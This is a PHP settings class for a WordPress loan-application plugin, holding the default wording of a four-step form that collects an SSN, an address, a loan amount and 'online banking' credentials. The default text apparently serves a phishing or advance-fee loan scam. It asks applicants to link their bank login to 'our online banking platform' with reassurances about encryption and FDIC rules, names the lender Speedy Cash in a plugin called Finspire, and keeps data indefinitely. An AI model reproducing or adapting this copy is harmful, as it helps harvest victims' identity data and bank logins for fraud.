<?php
if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

class Finspire_Loan_Settings {

    const OPTION_KEY = 'finspire_loan_settings';

    /**
     * Default settings synchronized with current 4-step frontend form
     */
    public static function get_defaults() {
        return [
            // Page & Header Setup
            'form_title'            => 'Start Verification',
            'form_subtitle'         => 'Complete the steps below to apply for your loan. Your information is 256-bit encrypted and secure.',
            'trust_badge_1'         => '256-bit SSL Encrypted',
            'trust_badge_2'         => 'Your data is protected',
            'trust_badge_3'         => 'No hard credit pull',
            'security_footer_text'  => 'All information is protected with 256-bit SSL encryption. We never share your data with third parties without your consent.',

            // Step Headers & Titles
            'step1_title'           => 'Personal Info',
            'step1_header'          => 'Step 1 of 4 — Personal Info',
            'step1_notice'          => "Your SSN is required to verify your identity. It's transmitted over a secure, encrypted connection.",
            'step2_title'           => 'Address',
            'step2_header'          => 'Step 2 of 4 — Address',
            'default_country'       => 'United States',
            'step3_title'           => 'Loan Amount',
            'step3_header'          => 'Step 3 of 4 — Loan Amount',
            'loan_purpose_options'  => "Pay off Credit Cards\nDebt Consolidation\nMedical Expenses\nHome Improvement\nMoving or Relocation\nMajor Purchase\nWedding\nCar Financing/Car Repair\nBusiness\nGreen Loan\nEducation\nVacation\nOthers",
            'step4_title'           => 'Banking Details',
            'step4_header'          => 'Step 4 of 4 — Banking Details',
            'step4_notice'          => 'Your banking credentials are used only to verify your account. They are encrypted end-to-end and never stored in plain text.',
            'step4_verification_text' => 'To verify your identity and ensure a secure transaction, We request that you link your bank account to our online banking platform. Your online banking information will be used solely to safely deposit your funds in line with FDIC regulations.',
            'step4_verification_label' => 'Online Banking Verification',
            'step4_contact_consent_text' => 'I agree to be contacted About my Application and understand that checking my rate does not impact my credit score.',
            // Fallback backward-compatible keys
            'step3_notice'          => 'Your banking credentials are used only to verify your account. They are encrypted end-to-end and never stored in plain text.',
            'step3_verification_text' => 'To verify your identity and ensure a secure transaction, We request that you link your bank account to our online banking platform. Your online banking information will be used solely to safely deposit your funds in line with FDIC regulations.',
            'step3_verification_label' => 'Online Banking Verification',
            'step3_contact_consent_text' => 'I agree to be contacted About my Application and understand that checking my rate does not impact my credit score.',

            // Loan Amounts & Currency
            'currency_symbol'       => '$',
            'min_loan_amount'       => 100,
            'max_loan_amount'       => 25000,
            'default_loan_amount'   => 500,
            'loan_step'             => 50,

            // Navigation Buttons
            'btn_continue'          => 'Continue',
            'btn_back'              => 'Back',
            'btn_cancel'            => 'Cancel',
            'btn_submit'            => 'Submit Application',
            'btn_submitting'        => 'Submitting...',
            'btn_home'              => 'Return to Home',

            // Privacy & Consent
            'privacy_policy_url'    => home_url( '/privacy-policy/' ),
            'consent_text'          => 'By submitting, you authorize Speedy Cash to verify your identity and banking information. Your data is encrypted and protected per our Privacy Policy.',

            // Success Page
            'success_title'         => 'Application Submitted!',
            'success_message'       => 'Thank you, {first_name}! Your application has been received. A confirmation has been sent to your email. Our team will review your information and contact you within 1 business day.',

            // Email Notifications
            'admin_email_enabled'   => 1,
            'admin_recipients'      => get_option( 'admin_email' ),
            'admin_email_subject'   => '[New Loan Application] #{reference_no} - {first_name} {last_name}',
            'applicant_email_enabled'=> 1,
            'applicant_email_subject'=> 'Your Loan Application #{reference_no} Has Been Received',

            // Spam & Security
            'enable_honeypot'       => 1,
            'min_submit_seconds'    => 3,
            'data_retention_days'   => 0, // 0 = indefinite

            // Page destination
            'loan_page_id'          => 0,
        ];
    }

    /**
     * Get all settings merged with defaults
     */
    public static function get_all() {
        $saved = get_option( self::OPTION_KEY, [] );
        return wp_parse_args( is_array( $saved ) ? $saved : [], self::get_defaults() );
    }

    /**
     * Get single setting
     */
    public static function get( $key, $default = null ) {
        $all = self::get_all();
        if ( isset( $all[ $key ] ) ) {
            return $all[ $key ];
        }
        return $default;
    }

    /**
     * Update settings array
     */
    public static function update_all( $new_settings ) {
        $current = self::get_all();
        $sanitized = self::sanitize( array_merge( $current, $new_settings ) );
        return update_option( self::OPTION_KEY, $sanitized );
    }

    /**
     * Sanitize settings before saving
     */
    public static function sanitize( $input ) {
        $clean = [];
        $defaults = self::get_defaults();

        foreach ( $defaults as $k => $v ) {
            if ( ! isset( $input[ $k ] ) ) {
                $clean[ $k ] = $v;
                continue;
            }

            if ( in_array( $k, ['min_loan_amount', 'max_loan_amount', 'default_loan_amount', 'loan_step'], true ) ) {
                $clean[ $k ] = max( 0, floatval( $input[ $k ] ) );
            } elseif ( in_array( $k, ['admin_email_enabled', 'applicant_email_enabled', 'enable_honeypot', 'loan_page_id', 'data_retention_days', 'min_submit_seconds'], true ) ) {
                $clean[ $k ] = intval( $input[ $k ] );
            } elseif ( 'privacy_policy_url' === $k ) {
                $clean[ $k ] = esc_url_raw( $input[ $k ] );
            } elseif ( in_array( $k, ['consent_text', 'form_subtitle', 'security_footer_text', 'success_message', 'step1_notice', 'step3_notice', 'step3_verification_text', 'step3_contact_consent_text', 'step4_notice', 'step4_verification_text', 'step4_contact_consent_text'], true ) ) {
                $clean[ $k ] = wp_kses_post( $input[ $k ] );
            } elseif ( 'loan_purpose_options' === $k ) {
                $clean[ $k ] = sanitize_textarea_field( $input[ $k ] );
            } else {
                $clean[ $k ] = sanitize_text_field( $input[ $k ] );
            }
        }

        if ( $clean['min_loan_amount'] > $clean['max_loan_amount'] ) {
            $tmp = $clean['min_loan_amount'];
            $clean['min_loan_amount'] = $clean['max_loan_amount'];
            $clean['max_loan_amount'] = $tmp;
        }

        return $clean;
    }

    /**
     * Get loan purpose dropdown options as an array
     */
    public static function get_loan_purpose_options() {
        $raw = self::get( 'loan_purpose_options', '' );
        if ( empty( $raw ) ) {
            return [
                'Pay off Credit Cards',
                'Debt Consolidation',
                'Medical Expenses',
                'Home Improvement',
                'Moving or Relocation',
                'Major Purchase',
                'Wedding',
                'Car Financing/Car Repair',
                'Business',
                'Green Loan',
                'Education',
                'Vacation',
                'Others',
            ];
        }
        $lines = array_filter( array_map( 'trim', explode( "\n", str_replace( "\r", '', $raw ) ) ) );
        return ! empty( $lines ) ? array_values( $lines ) : [
            'Pay off Credit Cards',
            'Debt Consolidation',
            'Medical Expenses',
            'Home Improvement',
            'Moving or Relocation',
            'Major Purchase',
            'Wedding',
            'Car Financing/Car Repair',
            'Business',
            'Green Loan',
            'Education',
            'Vacation',
            'Others',
        ];
    }
}
